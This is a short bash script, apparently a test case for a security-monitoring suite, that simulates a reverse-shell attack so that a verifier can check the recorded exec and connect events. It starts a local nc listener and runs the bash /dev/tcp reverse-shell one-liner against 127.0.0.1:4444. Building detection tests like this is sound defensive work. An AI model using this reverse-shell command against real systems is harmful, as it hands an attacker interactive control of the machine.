#!/bin/bash
# 用例 01 反弹 shell：攻击动作
# 预期（见 verify.sh）：外层 bash -c exec、内层反弹 bash exec、connect 127.0.0.1:4444
source "$(dirname "$0")/../lib.sh"
tag="${1:-case-01-r1}"
mark_begin "$tag"

nc -l 127.0.0.1 4444 >/dev/null 2>&1 &
NC_PID=$!
sleep 0.5
timeout 3 bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' >/dev/null 2>&1
kill $NC_PID 2>/dev/null
exit 0
